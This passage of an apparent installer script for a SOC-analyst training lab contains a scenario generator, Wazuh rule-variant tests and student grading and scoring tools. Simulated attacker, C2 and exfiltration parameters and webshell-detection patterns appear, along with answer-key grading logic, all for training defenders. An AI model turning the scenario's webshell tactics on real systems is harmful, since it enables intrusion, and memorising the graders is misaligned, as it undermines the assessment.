            self.hosts[name] = {"name": name, "role": role, "crit": crit, "ip": self._new_ip(net)}
        self.ip2host = {h["ip"]: n for n, h in self.hosts.items()}
        # nhan su: emp#### duy nhat
        self.staff = []
        ids = rng.sample(range(1000, 9999), 40)
        for i in ids:
            self.staff.append({"user": "emp%d" % i, "id": i,
                               "name": "%s %s %s" % (rng.choice(HO), rng.choice(DEM), rng.choice(TEN))})
        # chuoi tan cong
        self.attacker_ip = self.new_ext_ip()      # IP ke tan cong (SQLi, webshell)
        self.c2_ip = self.new_ext_ip()
        self.c2_port = rng.choice([443, 8443, 4443, 9443])
        self.exfil_domain = "%s-%s.%s" % (rng.choice(EXFIL_SLD), "".join(rng.choice("abcdefghjkmnpqrstuvwxyz") for _ in range(4)), rng.choice(EXFIL_TLD))
        self.webshell = rng.choice(WEBSHELL_NAMES) % rng.randint(10, 99)
        self.cmd_params = rng.sample(CMD_PARAMS, 5)
        self.upload_dir = "/uploads/"
        self.approved_script = rng.choice(APPROVED_UPLOAD_SCRIPTS)
        # dot trien khai agent sao luu (nguyen nhan bao): 2-3 may sao luu, TAT CA nam trong CHG.
        # Nguon duy nhat cua bao KHONG nam trong CHG la web-shop (C5) - dung goi y cap 2 cua kich ban.
        self.backup_hosts = []
        for k in range(rng.randint(2, 3)):
            name = "bk-%02d" % (k + 1)
            self.hosts[name] = {"name": name, "role": "may chu sao luu", "crit": "TB", "ip": self._new_ip(self.subnet_srv)}
            self.backup_hosts.append(name)
        self.backup_port = rng.choice(BACKUP_PORTS)
        self.ip2host = {h["ip"]: n for n, h in self.hosts.items()}
        self.av = rng.choice(AV_VENDORS)
        self.mon = rng.choice(MON_AGENTS)

    # ---------------------------------------------------------------- IP
    def _new_ip(self, net):
        while True:
            o = self.rng.randint(11, 249)
            ip = "%s.%d" % (net, o)
            if ip not in self._used_ips and o not in self._used_last_octets:
                self._used_ips.add(ip)
                self._used_last_octets.add(o)
                return ip

    def new_ext_ip(self):
        """IP ngoai, octet cuoi DUY NHAT (dung lam bang chung E)."""
        while True:
            a = self.rng.choice([45, 91, 103, 141, 176, 185, 193, 212])
            ip = "%d.%d.%d.%d" % (a, self.rng.randint(1, 254), self.rng.randint(1, 254), self.rng.randint(11, 249))
            o = int(ip.rsplit(".", 1)[1])
            if ip not in self._used_ips and o not in self._used_last_octets:
                self._used_ips.add(ip)
                self._used_last_octets.add(o)
                return ip

    def octet(self, ip):
        return int(ip.rsplit(".", 1)[1])

    def ip(self, host):
        return self.hosts[host]["ip"]

    def crit(self, host):
        return self.hosts[host]["crit"]

    def hosts_by_crit(self, crit, exclude=()):
        return [n for n, h in self.hosts.items()
                if h["crit"] == crit and n not in exclude and n not in ("siem", "dns-01") and not n.startswith("bk-")]

    def pick_host(self, crits, exclude=()):
        """Chon may cho MOT ticket hang doi; moi may toi da 1 ticket (tranh 2 ban ghi ngu canh cung may)."""
        used = getattr(self, "_used_hosts", set())
        self._used_hosts = used
        cand = [h for c in crits for h in self.hosts_by_crit(c, exclude=tuple(exclude) + tuple(used))]
        h = self.rng.choice(cand)
        used.add(h)
        return h

    def take_staff(self):
        return self.staff.pop(self.rng.randrange(len(self.staff)))

    def internal_ips(self):
        return [h["ip"] for n, h in self.hosts.items() if n not in ("siem",)]

    def public(self):
        """Phan KHONG nhay cam (de ghi log seed / gui defender): khong co dap an."""
        return {"hosts": self.hosts, "backup_port": self.backup_port, "approved_script": self.approved_script}


def make(seed):
    return World(random.Random(seed))
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/tools"
cat > "$LAB/tools/gen-grading18.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# gen-grading18.py - sinh instr_config/results.config + goals.config cho Bai 18 (P5).
#   python3 labs/soc-shift-capstone/tools/gen-grading18.py      (roi sinh lai install-soc-shift-capstone.sh)
#
# Nguyen tac (kich ban muc 9, lo trinh P5):
#   - Ticket so k = thu tu PHAT. defender in INC_k / ANS_*_k, siem in GT_*_k CUNG thu tu
#     -> so tung cap bang matchany + result._gt_* (cach da chay o soc-baseline).
#   - CHI dung integer_equal: tap so -> ma "1"+so dem 0 (canon), ten may -> crc32 (ca hai phia tinh giong nhau).
#   - siem CHI in dap an / tap an SAU HET CA (SHIFT_END=Y) -> checkwork giua ca khong lo dap an,
#     moi goal ra N; hint #CHECK_TRUE bao "ca chua ket thuc".
#   - Diem tong 100 do tools/score-bai18.py tinh (bang 9.2); goals chi la cong + thanh phan.
# ============================================================================
import os

NSLOT = 13                       # moi seed deu 13 ticket (socq.ca; test_socq kiem)
HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "..", "instr_config")

D, S = "defender:prestop.stdout", "siem:prestop.stdout"


def grp(name, cont, regex):
    return "%-16s = %s : GROUP : 1 : REGEX : %s" % (name, cont, regex)


def rx(name, cont, regex):
    return "%-16s = %s : FILE_REGEX : %s" % (name, cont, regex)


def results():
    r = ["# results.config - Bai 18 - SINH TU DONG boi tools/gen-grading18.py (KHONG sua tay).",
         "# defender: phieu da DONG BANG (bai18-thu-thap) ; siem: dap an + tap an + luong that (grade18 print, chi sau het ca).",
         "",
         rx("_def_marker", D, "DEFENDER18_MARKER"),
         rx("_siem_marker", S, "SIEM18_MARKER"),
         rx("_frozen", D, r"\bSHIFT_FROZEN\b"),
         rx("_siem_end", S, "SHIFT_END=Y"),
         "",
         "# --- hang doi: tung ticket theo thu tu phat ---"]
    for k in range(1, NSLOT + 1):
        r += [grp("_ans_inc_%d" % k, D, r"\bINC_%d=([0-9]+)" % k),
              grp("_ans_v_%d" % k, D, r"\bANS_V_%d=([0-9]+)" % k),
              grp("_ans_p_%d" % k, D, r"\bANS_P_%d=([0-9]+)" % k),
              grp("_ans_e_%d" % k, D, r"\bANS_E_%d=([0-9]+)" % k),
              grp("_gt_inc_%d" % k, S, r"\bGT_INC_%d=([0-9]+)" % k),
              grp("_gt_v_%d" % k, S, r"\bGT_V_%d=([0-9]+)" % k),
              grp("_gt_p_%d" % k, S, r"\bGT_P_%d=([0-9]+)" % k),
              grp("_gt_e_%d" % k, S, r"\bGT_E_%d=([0-9]+)" % k),
              grp("_gt_isp1_%d" % k, S, r"\bGT_ISP1_%d=([0-9]+)" % k)]
    r += ["",
          "# --- gom su co SC1 (su-co.txt) ---",
          grp("_ans_sc_tk", D, r"\bANS_SC_TK_C=([0-9]+)"),
          grp("_gt_sc_tk", S, r"\bGT_SC_TK_C=([0-9]+)"),
          grp("_ans_sc_host", D, r"\bANS_SC_HOST_C=([0-9]+)"),
          grp("_gt_sc_host", S, r"\bGT_SC_HOST_C=([0-9]+)"),
          grp("_gt_sc_hostip", S, r"\bGT_SC_HOSTIP_C=([0-9]+)"),
          grp("_ans_sc_gd", D, r"\bANS_SC_GIAI_DOAN=([0-9]+)"),
          grp("_gt_sc_gd", S, r"\bGT_SC_GIAI_DOAN=([0-9]+)"),
          "",
          "# --- ghi chu leo thang SC1 (leo-thang/SC1.txt), 7 truong dinh luong ---",
          grp("_lt_ticket", D, r"\bLT_TICKET=([0-9]+)")]
    r += [grp("_gt_sc_t%d" % i, S, r"\bGT_SC_T%d=([0-9]+)" % i) for i in range(1, 5)]
    r += [grp("_lt_host", D, r"\bLT_HOST_C=([0-9]+)"),
          grp("_lt_asset", D, r"\bLT_ASSET_LEVEL=([0-9]+)"),
          grp("_gt_sc_asset", S, r"\bGT_SC_ASSET=([0-9]+)"),
          grp("_lt_stage", D, r"\bLT_STAGE=([0-9]+)"),
          grp("_gt_sc_stage", S, r"\bGT_SC_STAGE=([0-9]+)"),
          grp("_lt_mitre", D, r"\bLT_MITRE_C=([0-9]+)"),
          grp("_gt_sc_mitre", S, r"\bGT_SC_MITRE_C=([0-9]+)"),
          grp("_lt_ioc", D, r"\bLT_IOC_C2=([0-9]+)"),
          grp("_gt_sc_ioc", S, r"\bGT_SC_IOC_C2=([0-9]+)"),
          grp("_lt_dx", D, r"\bLT_DE_XUAT_C=([0-9]+)"),
          grp("_gt_sc_dx", S, r"\bGT_SC_DE_XUAT_C=([0-9]+)"),
          "",
          "# --- luat (tap AN, luat dang nap cuoi ca) + luong that cua ca (siem) ---",
          rx("_rules_valid", S, "RULES_VALID=Y"),
          rx("_rb_not_blind", S, r"\bRB_NOT_BLIND\b"),
          rx("_ra_deployed", S, r"\bGATE_RA_DEPLOYED\b"),
          rx("_ra_p90", S, r"\bRA_P100=(9[0-9]|100)\b"),
          rx("_ra_r90", S, r"\bRA_R100=(9[0-9]|100)\b"),
          rx("_rb_p90", S, r"\bRB_P100=(9[0-9]|100)\b"),
          rx("_rb_r90", S, r"\bRB_R100=(9[0-9]|100)\b"),
          rx("_c3", S, r"\bC3_SEEN\b"),
          rx("_c5", S, r"\bC5_SEEN\b"),
          rx("_rb_contain20", S, r"\bRB_CONTAIN_MIN=([0-9]|1[0-9]|20)\b"),
          rx("_live_gap", S, r"\bLIVE_GAP\b"),
          "",
          "# --- sau ca ---",
          rx("_bg_full", D, r"\bBAN_GIAO_FILLED=[4-9]\b"),
          rx("_ks_truoc", D, r"\bKS_TRUOC=[1-5]"),
          rx("_ks_sau", D, r"\bKS_SAU=[1-5]"),
          "",
          "# --- Goi y checkwork (KHONG lo dap an) ---",
          "#CHECK_TRUE: Ca truc chua ket thuc - moi muc deu N cho toi khi het ca (phieu dong bang). Xem: trang-thai",
          rx("cw_ca_xong", D, r"\bSHIFT_FROZEN\b"),
          "#CHECK_TRUE: Yeu cau R-A cua IR chua duoc trien khai truoc khi het ca (can >= 1 luat canh bao trong dai R-A, nap bang kiem-thu-luat).",
          rx("cw_ra", S, r"\bGATE_RA_DEPLOYED\b"),
          "#CHECK_TRUE: Luat dai R-B dang nap bi MU tren tap kiem tra an (tat/ha luat hoac ngoai le qua rong). SOP muc 11.",
          rx("cw_rb", S, r"\bRB_NOT_BLIND\b"),
          "#CHECK_TRUE: ban-giao.txt chua dien du cac truong (SOP muc 12).",
          rx("cw_bangiao", D, r"\bBAN_GIAO_FILLED=[4-9]\b"),
          "#CHECK_TRUE: khao-sat.txt chua dien TRUOC= va SAU= (1-5).",
          rx("cw_khaosat", D, r"\bKS_SAU=[1-5]")]
    return "\n".join(r) + "\n"


def goals():
    g = ["# goals.config - Bai 18 - SINH TU DONG boi tools/gen-grading18.py (KHONG sua tay).",
         "# Cong (kich ban 9.1) + thanh phan. Diem tong 100: tools/score-bai18.py (bang 9.2).",
         "# Giua ca siem khong in dap an -> moi goal N.",
         "",
         "lab_ready = boolean : ( _siem_marker and _def_marker )",
         "",
         "# --- hang doi: v/p/e tung ticket; isp1 = ticket do la P1 cua chuoi ---"]
    for k in range(1, NSLOT + 1):
        g += ["v_%d = matchany : integer_equal : _ans_v_%d : result._gt_v_%d" % (k, k, k),
              "p_%d = matchany : integer_equal : _ans_p_%d : result._gt_p_%d" % (k, k, k),
              "e_%d = matchany : integer_equal : _ans_e_%d : result._gt_e_%d" % (k, k, k),
              "isp1_%d = matchany : integer_equal : _gt_isp1_%d : answer=1" % (k, k),
              "p1ok_%d = boolean : ( v_%d and p_%d ) or_not isp1_%d" % (k, k, k, k)]
    g += ["",
          "# --- 3 cong bat buoc ---",
          "gate_no_missed_p1 = boolean : ( _frozen and _siem_end and %s )" % " and ".join("p1ok_%d" % k for k in range(1, NSLOT + 1)),
          "gate_storm_not_blind = boolean : ( _siem_end and _rb_not_blind )",
          "gate_ra_deployed = boolean : ( _siem_end and _ra_deployed )",
          "bai18_gates = boolean : ( gate_no_missed_p1 and gate_storm_not_blind and gate_ra_deployed )",
          "",
          "# --- gom su co SC1 ---",
          "sc1_tickets = matchany : integer_equal : _ans_sc_tk : result._gt_sc_tk",
          "sc1_host_ten = matchany : integer_equal : _ans_sc_host : result._gt_sc_host",
          "sc1_host_ip = matchany : integer_equal : _ans_sc_host : result._gt_sc_hostip",
          "sc1_host = boolean : ( sc1_host_ten or sc1_host_ip )",
          "sc1_giai_doan = matchany : integer_equal : _ans_sc_gd : result._gt_sc_gd",
          "",
          "# --- ghi chu leo thang SC1: TICKET = bat ky ticket nao cua chuoi ---"]
    g += ["lt_ticket_%d = matchany : integer_equal : _lt_ticket : result._gt_sc_t%d" % (i, i) for i in range(1, 5)]
    g += ["lt_ticket = boolean : ( lt_ticket_1 or lt_ticket_2 or lt_ticket_3 or lt_ticket_4 )",
          "lt_host_ten = matchany : integer_equal : _lt_host : result._gt_sc_host",
          "lt_host_ip = matchany : integer_equal : _lt_host : result._gt_sc_hostip",
          "lt_host = boolean : ( lt_host_ten or lt_host_ip )",
          "lt_asset = matchany : integer_equal : _lt_asset : result._gt_sc_asset",
          "lt_stage = matchany : integer_equal : _lt_stage : result._gt_sc_stage",
          "lt_mitre = matchany : integer_equal : _lt_mitre : result._gt_sc_mitre",
          "lt_ioc_c2 = matchany : integer_equal : _lt_ioc : result._gt_sc_ioc",
          "lt_de_xuat = matchany : integer_equal : _lt_dx : result._gt_sc_dx",
          "",
          "# --- chat luong luat (tap an, P va R >= 0.9) + luong that ---",
          "ra_quality = boolean : ( _siem_end and _rules_valid and _ra_p90 and _ra_r90 )",
          "rb_quality = boolean : ( _siem_end and _rules_valid and _rb_p90 and _rb_r90 )",
          "c3_seen = boolean : ( _siem_end and _c3 )",
          "c5_seen = boolean : ( _siem_end and _c5 )",
          "storm_contained = boolean : ( _siem_end and _rb_contain20 and _rb_not_blind )",
          "",
          "# --- sau ca ---",
          "ban_giao = boolean : ( _frozen and _bg_full )",
          "khao_sat = boolean : ( _ks_truoc and _ks_sau )"]
    return "\n".join(g) + "\n"


def main():
    open(os.path.join(OUT, "results.config"), "w").write(results())
    open(os.path.join(OUT, "goals.config"), "w").write(goals())
    print("Da sinh results.config + goals.config (%d ticket)" % NSLOT)


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/tools"
cat > "$LAB/tools/p7-luat.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# p7-luat.py - P7 nhom A (CHI phat trien): cham TAP AN cho cac bien the luat T5-T10 (lo trinh P7),
# khong can chay ca. Chay ROOT tren siem:
#   docker cp labs/soc-shift-capstone/tools/p7-luat.py <siem>:/home/ubuntu/bai18/
#   docker exec <siem> python3 /home/ubuntu/bai18/p7-luat.py
# Moi bien the: ghi local_rules.xml (tu giai mau cua SV nay) -> analysisd -t -> restart -> grade18 rules.
# Cuoi cung NAP LAI giai mau. Lam SAU khi ca da het (lich su nap luat bi ghi them), roi reset-ca.
# ============================================================================
import os, re, subprocess, sys, time

sys.path.insert(0, "/home/ubuntu/bai18")
sys.path.insert(0, "/home/ubuntu/bai18/lib")
import grade18 as g  # noqa: E402
import socq.ca as ca  # noqa: E402

ST = g.ST


def world():
    s = ca.build(int(open(os.path.join(ST, "seed")).read()), int(open(os.path.join(ST, "t_ref")).read()))
    return s["world"], s["ctx"]


def mau_xml(w, cx):
    return g.MAU_XML % {"script": (w.upload_dir + w.approved_script).replace(".", "\\."), "svc": cx.svc_upload, "chg": cx.chg_backup}


def sub_rule(xml, rid, new):
    """Thay ca khoi <rule id="rid" ...>...</rule> (new='' -> xoa)."""
    return re.sub(r'\s*<rule id="%s".*?</rule>' % rid, ("\n  " + new) if new else "", xml, flags=re.S)


def variants(w, cx):
    m = mau_xml(w, cx)
    net = w.ip("web-shop").rsplit(".", 1)[0] + ".0/24"
    ex = lambda cond: ('<rule id="100341" level="0">\n    <if_sid>100342</if_sid>\n    %s\n'  # noqa: E731
                       '    <description>ngoai le (bien the P7)</description>\n  </rule>' % cond)
    return [
        ("T9  giai mau (ngoai le may sao luu VA cong)", m, {"RB_NOT_BLIND": True, "RA_R100": 100, "RB_R100": 100}),
        ("T5a ha 100340 xuong level 3", m.replace('id="100340" level="10"', 'id="100340" level="3"'), {"RB_NOT_BLIND": False}),
        ("T5b xoa luat 100340", sub_rule(m, "100340", ""), {"RB_NOT_BLIND": False}),
        ("T6  nguong tan suat x10", m.replace('frequency="8"', 'frequency="80"'), {"RB_NOT_BLIND": False}),
        ("T7  loai tru ca dai noi bo %s" % net, sub_rule(m, "100341", ex("<srcip>%s</srcip>" % net)), {"RB_NOT_BLIND": False}),
        ("T8  loai tru theo cong 22", sub_rule(m, "100341", ex("<dstport>22</dstport>")), {"RB_NOT_BLIND": False}),
        ("T10 R-A chi bat cmd=", m.replace('<url type="pcre2">^/uploads/[^?]*\\.(php|phtml|phar)\\?</url>',
                                            '<url type="pcre2">[?&amp;]cmd=</url>'), {"RA_R100_MAX": 89}),
    ]


def load(xml):
    open(g.RULES, "w").write(xml)
    subprocess.run("chown wazuh:wazuh %s" % g.RULES, shell=True)
    t = subprocess.run(["/var/ossec/bin/wazuh-analysisd", "-t"], capture_output=True, text=True)
    if t.returncode != 0:
        return "analysisd -t LOI: " + (t.stdout + t.stderr).strip()[-200:]
    subprocess.run("/var/ossec/bin/wazuh-control restart >/dev/null 2>&1", shell=True)
    return None


def main():
    if os.geteuid() != 0:
        raise SystemExit("can root")
    w, cx = world()
    g.do_mau(True)                     # lists giai mau (sao-luu-hosts/ports) cho moi bien the
    subprocess.run("systemctl stop grade-bai18.path", shell=True)   # khong cham chong khi doi file luat
    bad = 0
    try:
        for name, xml, exp in variants(w, cx):
            t0 = time.time()
            err = load(xml)
            if err:
                print("%-48s %s" % (name, err))
                bad += 1
                continue
            g.do_rules(0)
            txt = open(os.path.join(ST, "rules.txt")).read()
            kv = dict(re.findall(r"\b([A-Z0-9_]+)=(\S+)", txt))
            got = {"RB_NOT_BLIND": "RB_NOT_BLIND" in txt}
            errs = []
            for k, v in exp.items():
                if k == "RA_R100_MAX":
                    if int(kv.get("RA_R100", 0)) > v:
                        errs.append("RA_R100=%s (can <= %d)" % (kv.get("RA_R100"), v))
                elif k == "RB_NOT_BLIND":
                    if got[k] != v:
                        errs.append("RB_NOT_BLIND=%s (can %s)" % (got[k], v))
                elif int(kv.get(k, -1)) != v:
                    errs.append("%s=%s (can %s)" % (k, kv.get(k), v))
            bad += bool(errs)
            print("%-48s RA P/R=%s/%s RB P/R=%s/%s %s  (%ds) %s" % (
                name, kv.get("RA_P100"), kv.get("RA_R100"), kv.get("RB_P100"), kv.get("RB_R100"),
                "NOT_BLIND" if got["RB_NOT_BLIND"] else "MU", time.time() - t0, ("LOI: " + "; ".join(errs)) if errs else "OK"))
            sys.stdout.flush()
    finally:
        g.do_mau(True)                 # tra lai giai mau
        subprocess.run("systemctl start grade-bai18.path", shell=True)
    print("%d loi" % bad)


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/tools"
cat > "$LAB/tools/score-bai18.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# score-bai18.py - DIEM TONG 100 cua Bai 18 (kich ban muc 9.2) + 3 cong (9.1) + so lieu do an.
# Chay NGOAI lab (may giang vien), doc thang prestop.stdout cua siem + defender:
#   python3 score-bai18.py <thu muc / file .lab / file .zip / 2 file prestop>...  [--csv out.csv] [-v]
#   - thu muc: moi file *.lab (hoac *.zip) ben trong = 1 sinh vien (thu muc labtainer_xfer/... cua gradelab)
#   - 2 file text: 1 sinh vien (file nao co SIEM18_MARKER / DEFENDER18_MARKER tu nhan ra)
# Khong phu thuoc Labtainers: chi can python3. Doc ban prestop MOI NHAT co marker cua moi container.
# Quy uoc (lo trinh P5, chot voi nhom):
#   - ticket khong co dong -> MTTA = 90' khi tinh trung vi; V/P/E = sai
#   - nhieu dong cung ticket -> V/P/E lay dong CUOI truoc dong bang, MTTA lay dong DAU (watcher)
#   - R-A "trien khai" = lan nap thanh cong dau tien co luat canh bao dai R-A (siem: RA_DEPLOY_REL)
#   - siem tat giua ca (LIVE_GAP: khong do duoc bao) -> khoanh vung R-B tinh theo lan sua R-B dau tien
#     (RB_FIX_REL) va C5 tinh theo recall R-B tap an; ghi chu LIVE_GAP trong cot ghi_chu
# ============================================================================
import csv, io, os, re, statistics, sys, zipfile

KV = re.compile(r"\b([A-Z][A-Z0-9_]*)=(\S*)")
FLAG = re.compile(r"^\s*([A-Z][A-Z0-9_]+)\s*$")


def parse(text):
    kv, flags = {}, set()
    for ln in text.splitlines():
        for k, v in KV.findall(ln):
            kv.setdefault(k, v)                     # lan dau xuat hien (giong GROUP REGEX cua Labtainers)
        m = FLAG.match(ln)
        if m:
            flags.add(m.group(1))
    return kv, flags


# ------------------------------------------------------------------ doc bai nop
def _texts_from_zip(zf, depth=0):
    for n in zf.namelist():
        if n.endswith("/"):
            continue
        data = zf.read(n)
        if n.lower().endswith((".zip", ".lab", ".tar.zip")) and depth < 3:
            try:
                yield from _texts_from_zip(zipfile.ZipFile(io.BytesIO(data)), depth + 1)
            except zipfile.BadZipFile:
                pass
        elif "prestop.stdout" in n:
            yield n, data.decode("utf-8", "replace")


def collect(paths):
    """-> {sinh_vien: {'siem': text, 'defender': text}} (ban moi nhat theo ten file .<timestamp>)."""
    subs = {}

    def add(student, name, text):
        role = "siem" if "SIEM18_MARKER" in text else "defender" if "DEFENDER18_MARKER" in text else None
        if not role:
            return
        cur = subs.setdefault(student, {}).get(role)
        if cur is None or name > cur[0]:
            subs[student][role] = (name, text)

    loose = []
    for p in paths:
        if os.path.isdir(p):
            for n in sorted(os.listdir(p)):
                q = os.path.join(p, n)
                if n.lower().endswith((".lab", ".zip")) and zipfile.is_zipfile(q):
                    st = n.split(".")[0]
                    for name, t in _texts_from_zip(zipfile.ZipFile(q)):
                        add(st, name, t)
        elif zipfile.is_zipfile(p):
            st = os.path.basename(p).split(".")[0]
            for name, t in _texts_from_zip(zipfile.ZipFile(p)):
                add(st, name, t)
        else:
            loose.append(p)
    for p in loose:
        add("sv", p, open(p, encoding="utf-8", errors="replace").read())
    return {s: {r: v[1] for r, v in d.items()} for s, d in subs.items()}


# ------------------------------------------------------------------ cham
def step(minutes, full, half, lim_full, lim_half):
    if minutes is None:
        return 0.0
    return full if minutes <= lim_full else half if minutes <= lim_half else 0.0


def num(d, k):
    try:
        return int(d[k])
    except (KeyError, ValueError):
        return None


def nset(s):
    return {int(x) for x in re.findall(r"\d+", s or "")}


def score(siem_txt, def_txt):
    g, gf = parse(siem_txt)
    a, af = parse(def_txt)
    note = []
    r = {}
    if "SHIFT_RUNNING" in gf or g.get("SHIFT_END") != "Y":
        note.append("siem: ca chua ket thuc")
    if "SHIFT_FROZEN" not in af:
        note.append("defender: phieu chua dong bang")
    scale = float(a.get("SCALE") or 1.0)
    n = num(g, "GT_N") or 0
    # ---- hang doi
    ok_v = ok_e = ok_p = n_tp = 0
    p1_mtta, normal_mtta, p1_all_ok, p1_tp = [], [], True, 0
    for k in range(1, n + 1):
        gv, gp, ge, isp1 = (num(g, "GT_%s_%d" % (x, k)) for x in ("V", "P", "E", "ISP1"))
        av, ap, ae = (num(a, "ANS_%s_%d" % (x, k)) for x in ("V", "P", "E"))
        if a.get("INC_%d" % k) not in (None, g.get("GT_INC_%d" % k)):
            note.append("lech thu tu slot %d (INC %s/%s)" % (k, a.get("INC_%d" % k), g.get("GT_INC_%d" % k)))
        ok_v += av == gv
        ok_e += ae == ge
        if gv == 1:
            n_tp += 1
            ok_p += ap == gp
        lat = num(a, "LAT_%d" % k)
        mins = lat / 60.0 / scale if lat is not None else None
        if isp1:
            p1_mtta.append(mins)
            if not (av == 1 and ap == 1):
                p1_all_ok = False
            p1_tp += av == 1
        else:
            normal_mtta.append(mins if mins is not None else 90.0)
    r["verdict"] = 15.0 * ok_v / n if n else 0
    r["bang_chung"] = 10.0 * ok_e / n if n else 0
    r["uu_tien_tp"] = 5.0 * ok_p / n_tp if n_tp else 0
    # ---- SC1
    gt_tk, ans_tk = nset(g.get("GT_SC_TICKETS")), nset(a.get("ANS_SC_TICKETS"))
    diff = len(gt_tk ^ ans_tk)
    sc = 3.0 if gt_tk and diff == 0 else 1.0 if gt_tk and diff == 1 else 0.0
    host_ok = num(a, "ANS_SC_HOST_C") in (num(g, "GT_SC_HOST_C"), num(g, "GT_SC_HOSTIP_C")) and num(a, "ANS_SC_HOST_C") not in (None, 0)
    sc += 1.0 * host_ok
    sc += 1.0 * (num(a, "ANS_SC_GIAI_DOAN") == num(g, "GT_SC_GIAI_DOAN") is not None)
    r["gom_su_co"] = sc
    lt = [num(a, "LT_TICKET") in gt_tk,
          num(a, "LT_HOST_C") in (num(g, "GT_SC_HOST_C"), num(g, "GT_SC_HOSTIP_C")) and num(a, "LT_HOST_C") not in (None, 0),
          num(a, "LT_ASSET_LEVEL") == num(g, "GT_SC_ASSET"),
          num(a, "LT_STAGE") == num(g, "GT_SC_STAGE"),
          nset(a.get("LT_MITRE")) == nset(g.get("GT_SC_MITRE")) != set(),
          num(a, "LT_IOC_C2") == num(g, "GT_SC_IOC_C2"),
          nset(a.get("LT_DE_XUAT")) == nset(g.get("GT_SC_DE_XUAT")) != set()]
    r["leo_thang"] = 5.0 * sum(1 for x in lt if x) / 7
    # ---- thoi gian
    r["mtta_p1"] = sum(step(m, 3.0, 1.5, 10, 15) for m in p1_mtta)
    med = statistics.median(normal_mtta) if normal_mtta else 90.0
    r["mtta_thuong"] = max(0.0, min(8.0, 8.0 * (15 - med) / 10))
    r["ra_thoi_gian"] = step(num(g, "RA_DEPLOY_REL"), 5.0, 2.0, 20, 30)
    gap = "LIVE_GAP" in gf
    if gap:
        note.append("LIVE_GAP: siem tat giua ca, khoanh vung/C5 tinh du phong")
        r["rb_khoanh_vung"] = step(num(g, "RB_FIX_REL"), 5.0, 2.0, 20, 30)
    else:
        r["rb_khoanh_vung"] = step(num(g, "RB_CONTAIN_MIN"), 5.0, 2.0, 20, 30)
    if "RB_NOT_BLIND" not in gf:
        r["rb_khoanh_vung"] = 0.0          # "dap" bao bang cach lam mu luat khong phai khoanh vung
    # ---- chat luong luat (tap an)
    valid = g.get("RULES_VALID") == "Y"
    pr = lambda f: ((num(g, f + "_P100") or 0) + (num(g, f + "_R100") or 0)) / 200.0 if valid else 0.0  # noqa: E731
    r["ra_tap_an"] = 15.0 * pr("RA")
    r["rb_tap_an"] = 10.0 * pr("RB")
    if "C5_SEEN" in gf:
        r["c5"] = 5.0
    elif gap and (num(g, "RB_R100") or 0) >= 90:
        r["c5"] = 5.0
    else:
        r["c5"] = 0.0
    total = sum(r.values())
    gates = {"gate_no_missed_p1": p1_all_ok and "SHIFT_FROZEN" in af and n > 0,
             "gate_storm_not_blind": "RB_NOT_BLIND" in gf,
             "gate_ra_deployed": "GATE_RA_DEPLOYED" in gf}
    out = {k: round(v, 2) for k, v in r.items()}
    out.update({"tong": round(total, 1), **{k: "Y" if v else "N" for k, v in gates.items()}})
    out["dat"] = "Y" if all(gates.values()) and total >= 60 else "N"
    # so lieu do an + phu
    out["TRIAGE_TIME_MEDIAN"] = round(med, 1)
    out["VERDICT_ACCURACY"] = round(ok_v / n, 3) if n else 0
    out["ATTACKS_DETECTED"] = "%d/%d" % (p1_tp + ("C5_SEEN" in gf), len(p1_mtta) + 1)
    out["mtta_p1_phut"] = ";".join("-" if m is None else "%.1f" % m for m in p1_mtta)
    for k in ("KS_TRUOC", "KS_SAU", "GOI_Y_USES", "KIEM_THU_RUNS", "LICH_CA_RESTARTS"):
        out[k] = (a.get(k) if k in a else g.get(k, "")) or ""
    out["ghi_chu"] = " | ".join(note)
    return out


COLS = ["sinh_vien", "tong", "dat", "gate_no_missed_p1", "gate_storm_not_blind", "gate_ra_deployed",
        "verdict", "bang_chung", "uu_tien_tp", "gom_su_co", "leo_thang",
        "mtta_p1", "mtta_thuong", "ra_thoi_gian", "rb_khoanh_vung", "ra_tap_an", "rb_tap_an", "c5",
        "TRIAGE_TIME_MEDIAN", "VERDICT_ACCURACY", "ATTACKS_DETECTED", "mtta_p1_phut",
        "KS_TRUOC", "KS_SAU", "GOI_Y_USES", "KIEM_THU_RUNS", "LICH_CA_RESTARTS", "ghi_chu"]


def main(argv):
    args = [x for x in argv if not x.startswith("-")]
    csv_out = None
    if "--csv" in argv:
        csv_out = argv[argv.index("--csv") + 1]
        args.remove(csv_out)
    if not args:
        raise SystemExit(__doc__ or "dung: score-bai18.py <thu muc|.lab|2 file prestop> [--csv out.csv] [-v]")
    rows = []
    for st, d in sorted(collect(args).items()):
        if "siem" not in d or "defender" not in d:
            rows.append({"sinh_vien": st, "ghi_chu": "thieu prestop %s" % ("siem" if "siem" not in d else "defender")})
            continue
        row = {"sinh_vien": st, **score(d["siem"], d["defender"])}
        rows.append(row)
    w = csv.DictWriter(open(csv_out, "w", newline="") if csv_out else sys.stdout, fieldnames=COLS, extrasaction="ignore")
    w.writeheader()
    for row in rows:
        w.writerow(row)
    if "-v" in argv:
        for row in rows:
            print("\n== %s" % row["sinh_vien"], file=sys.stderr)
            for c in COLS[1:]:
                print("  %-22s %s" % (c, row.get(c, "")), file=sys.stderr)


if __name__ == "__main__":
    main(sys.argv[1:])
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/tools"
cat > "$LAB/tools/test-grading18.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# test-grading18.py - kiem thu P5 NGOAI lab (S7): sinh prestop gia cua siem + defender cho nhieu "bai lam",
# cham bang (1) bo danh gia goals mo phong ngu nghia Labtainers (GROUP/FILE_REGEX, matchany integer_equal,
# boolean and/or/and_not/or_not) tren results.config/goals.config DA SINH, va (2) score-bai18.py.
#   cd labs/_shared && python3 ../soc-shift-capstone/tools/test-grading18.py
# Mo phong KHONG thay the checkwork that: chi bat loi cu phap/ten/logic cua file sinh ra.
# ============================================================================
